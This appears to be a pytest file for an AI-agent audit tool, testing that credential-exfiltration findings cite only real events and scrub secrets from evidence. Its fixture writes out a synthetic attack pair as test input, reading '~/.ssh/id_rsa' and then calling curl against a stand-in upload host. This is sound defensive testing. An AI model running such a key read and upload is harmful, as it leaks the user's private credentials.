"""Finding evidence comes from cited canonical events, never extra capture."""

from __future__ import annotations

import json
from copy import deepcopy

import pytest
from fastapi.testclient import TestClient

from agentmetry.api.main import app
from agentmetry.core.audit.detection.artifacts import MAX_BYTES, MAX_ITEMS, build_artifacts
from agentmetry.core.audit.detection.live import observe_host
from agentmetry.core.audit.detection.live_store import reset_live_store_singleton
from agentmetry.core.audit.detection.models import Detection
from agentmetry.core.audit.detection.traits import classify_command
from agentmetry.core.audit.trail_db import get_trail_db
from agentmetry.core.config import settings


@pytest.fixture
def client(monkeypatch):
    identity = lambda: {"host_id": "synthetic-host", "fleet_id": "synthetic-fleet"}  # noqa: E731
    monkeypatch.setattr("agentmetry.core.audit.external.identity_fields", identity)
    monkeypatch.setattr("agentmetry.core.audit.detection.live.identity_fields", identity)
    monkeypatch.setattr(settings, "audit_sink", "file")
    # No lifespan: this exercise needs neither hook installation nor watchers.
    return TestClient(app)


def _pair(client, *, rich=False, restart=False):
    ids = []
    for qualified, command, arguments in (
        ("Read", "cat ~/.ssh/id_rsa", {"file_path": "/synthetic/.ssh/id_rsa", "content": "DO_NOT_COPY"}),
        ("Bash", "curl https://upload.example.invalid", {
            "url": "https://user:synthetic@upload.example.invalid/ingest?token=synthetic#private",
            "password": "DO_NOT_COPY",
        }),
    ):
        tool = {"qualified": qualified, "server": "synthetic-tools", "input_hash": "a" * 64,
                "traits": classify_command(command)}
        if qualified == "Bash":
            tool["mitre"] = {"tactic_id": "TA0011", "technique_id": "T1071.001"}
        if rich:
            tool.update(command=command, arguments=arguments)
        response = client.post("/api/v1/audit/ingest", json={
            "source_app": "claude", "event_type": "tool_called", "correlation_id": "synthetic-session",
            "tool": tool,
        })
        assert response.status_code == 200
        ids.append(response.json()["event_id"])
        if restart and len(ids) == 1:
            reset_live_store_singleton()
    findings = get_trail_db().events_by_action_type("detection")
    finding = next(e for e in findings if e["detection"]["rule_id"] == "credential-exfil")
    assert finding["action"]["outcome"] == "critical"
    assert finding["detection"]["event_ids"] == ids
    forwarded = [json.loads(line)["event"] for line in settings.audit_export_path.read_text(encoding="utf-8").splitlines()]
    exported = next(e for e in forwarded if e.get("event_id") == finding["event_id"])
    assert exported["detection"] == finding["detection"]
    return finding["detection"]["artifacts"], ids


def test_hashed_ingest_emits_only_available_evidence(client):
    block, ids = _pair(client)
    assert block["version"] == 1
    assert block["referenced_count"] == 2
    assert block["unavailable_count"] == block["omitted_count"] == 0
    assert block["truncated"] is False
    assert [e["event_id"] for e in block["items"]] == ids
    assert [e["tool"]["name"] for e in block["items"]] == ["Read", "Bash"]
    assert all(e["tool"]["server"] == "synthetic-tools" for e in block["items"])
    assert all("arguments" not in e["tool"] and "command" not in e["tool"] for e in block["items"])
    assert "input_hash" not in json.dumps(block)


def test_rich_ingest_copies_selected_fields_without_url_credentials(client):
    block, _ = _pair(client, rich=True)
    read, egress = block["items"]
    assert read["tool"]["arguments"] == {"file_path": "/synthetic/.ssh/id_rsa"}
    assert read["tool"]["command"] == "cat ~/.ssh/id_rsa"
    assert egress["tool"]["arguments"] == {"url": "https://upload.example.invalid/ingest"}
    assert "tool.arguments.url" in egress["sanitized_fields"]
    assert "DO_NOT_COPY" not in json.dumps(block)
    assert "token=" not in json.dumps(block)


def test_persisted_window_keeps_evidence_after_observer_restart(client):
    block, ids = _pair(client, restart=True)
    assert [e["event_id"] for e in block["items"]] == ids
    assert block["unavailable_count"] == 0


def test_host_finding_preserves_each_source_session():
    finding = None
    for i in range(8):
        hits = observe_host({
            "event_id": f"synthetic-{i}", "host_id": "synthetic-host", "fleet_id": "synthetic-fleet",
            "correlation_id": f"synthetic-session-{i // 2}", "timestamp_utc": "2026-11-10T12:00:00Z",
            "action": {"type": "tool_called", "outcome": "success", "reason": "subagent_start:explore"},
            "tool": {"qualified": "kimi.subagent.explore", "server": "kimi"},
        })
        finding = next((h for h in hits if h.rule_id == "host-subagent-swarm-burst"), finding)
    assert finding is not None
    block = finding.as_dict()["artifacts"]
    assert [e["event_id"] for e in block["items"]] == finding.event_ids
    assert {e["correlation_id"] for e in block["items"]} == {f"synthetic-session-{i}" for i in range(4)}


def _event(event_id="synthetic-a", **changes):
    return {
        "event_id": event_id, "correlation_id": "synthetic-session", "host_id": "synthetic-host",
        "fleet_id": "synthetic-fleet", "timestamp_utc": "2026-11-10T12:00:00Z",
        "source": {"app": "claude", "adapter": "claude_hook"},
        "action": {"type": "tool_called", "outcome": "success"},
        "tool": {"name": "Read", "qualified": "Read", "server": "synthetic-tools"}, **changes,
    }


def _finding(ids):
    return Detection("synthetic-rule", "Synthetic", "high", "Synthetic finding", "synthetic-session", event_ids=ids)


def test_reference_order_deduplication_and_missing_rows():
    a, b = _event(), _event("synthetic-b")
    block = build_artifacts(_finding(["synthetic-b", "synthetic-a", "synthetic-b", "missing"]), [a, b], a)
    assert [e["event_id"] for e in block["items"]] == ["synthetic-b", "synthetic-a"]
    assert block["referenced_count"] == 3
    assert block["unavailable_count"] == 1
    assert block["truncated"] is False


@pytest.mark.parametrize("changes", [
    {"host_id": "other-host"}, {"fleet_id": "other-fleet"}, {"correlation_id": "other-session"},
])
def test_session_evidence_rejects_wrong_scope(changes):
    trigger = _event()
    source = _event(**changes)
    block = build_artifacts(_finding([source["event_id"]]), [source], trigger)
    assert block["items"] == []
    assert block["unavailable_count"] == 1


@pytest.mark.parametrize("key", ["host_id", "fleet_id"])
def test_host_evidence_still_rejects_other_machine_or_fleet(key):
    source = _event(**{key: "other"})
    block = build_artifacts(_finding([source["event_id"]]), [source], _event(), host_scope=True)
    assert block["unavailable_count"] == 1


def test_ambiguous_ids_and_uncited_rows_do_not_supply_evidence():
    event = _event()
    block = build_artifacts(_finding([event["event_id"]]), [event, deepcopy(event), _event("uncited")], event)
    assert block["items"] == []
    assert block["unavailable_count"] == 1


def test_item_limit_reports_omitted_references():
    events = [_event(f"synthetic-{i}") for i in range(MAX_ITEMS + 5)]
    block = build_artifacts(_finding([e["event_id"] for e in events]), events, events[-1])
    assert len(block["items"]) == MAX_ITEMS
    assert block["omitted_count"] == 5
    assert block["unavailable_count"] == 0
    assert block["truncated"] is True


def test_serialized_size_limit_handles_multibyte_text():
    events = [_event(f"synthetic-{i}", tool={"name": "Bash", "command": "\u03bb" * 4096}) for i in range(MAX_ITEMS)]
    block = build_artifacts(_finding([e["event_id"] for e in events]), events, events[-1])
    assert len(json.dumps(block).encode("utf-8")) <= MAX_BYTES
    assert 0 < len(block["items"]) < MAX_ITEMS
    assert block["omitted_count"] == MAX_ITEMS - len(block["items"])
    assert block["truncated"] is True


def test_overlong_artifacts_are_omitted_without_changing_their_meaning():
    event = _event(tool={"name": "Bash", "command": "x" * 4097, "arguments": {"path": "x" * 2049}})
    block = build_artifacts(_finding([event["event_id"]]), [event], event)
    item = block["items"][0]
    assert item["tool"] == {"name": "Bash"}
    assert set(item["omitted_fields"]) == {"tool.command", "tool.arguments.path"}
    assert block["truncated"] is True


@pytest.mark.parametrize("key,value", [
    ("path", "token=x " * 256),
    ("url", "https://synthetic.invalid/" + "token=x;" * 250),
])
def test_redaction_expansion_cannot_exceed_the_exported_field_limit(key, value):
    # A source string can fit while its replacement markers exceed the limit.
    event = _event(tool={"name": "Read", "arguments": {key: value}})
    block = build_artifacts(_finding([event["event_id"]]), [event], event)
    item = block["items"][0]
    assert "arguments" not in item["tool"]
    assert item["omitted_fields"] == [f"tool.arguments.{key}"]
    assert block["truncated"] is True


@pytest.mark.parametrize("url", ["not a URL", "https://host.invalid:broken/path", "file:///synthetic/path"])
def test_invalid_or_unsupported_url_is_explicitly_omitted(url):
    event = _event(tool={"name": "WebFetch", "arguments": {"url": url}})
    block = build_artifacts(_finding([event["event_id"]]), [event], event)
    assert block["items"][0]["omitted_fields"] == ["tool.arguments.url"]
    assert "arguments" not in block["items"][0]["tool"]


@pytest.mark.parametrize("outcome,reason", [("denied", "policy"), ("approved", "inferred:tool_after_prompt")])
def test_gate_observation_retains_disposition_and_inference_without_fabricating_a_call(outcome, reason):
    event = _event(action={"type": "approval_response", "outcome": outcome, "reason": reason}, tool=None,
                   gated_action={"tool": "Bash", "server": "shell", "input_hash": "a" * 64})
    block = build_artifacts(_finding([event["event_id"]]), [event], event)
    item = block["items"][0]
    assert item["action"] == event["action"]
    assert item["gated_action"] == {"tool": "Bash", "server": "shell"}
    assert "tool" not in item


def test_snapshots_are_detached_allowlisted_and_scrubbed():
    event = _event(
        account={"email": "synthetic@example.invalid"}, environment={"TOKEN": "EXCLUDED"},
        output="EXCLUDED", pid=1234,
        tool={"name": "Bash", "command": "run --token synthetic-canary", "pid": 1234,
              "arguments": {"path": "/synthetic/file", "nested": {"content": "EXCLUDED"}}},
    )
    before = deepcopy(event)
    block = build_artifacts(_finding([event["event_id"]]), [event], event)
    serialized = json.dumps(block)
    assert "EXCLUDED" not in serialized and "synthetic@example.invalid" not in serialized
    assert "synthetic-canary" not in serialized and "pid" not in serialized
    assert block["items"][0]["sanitized_fields"] == ["tool.command"]
    block["items"][0]["tool"]["arguments"]["path"] = "changed"
    assert event == before


def test_legacy_findings_have_no_artifact_field():
    assert "artifacts" not in _finding([]).as_dict()
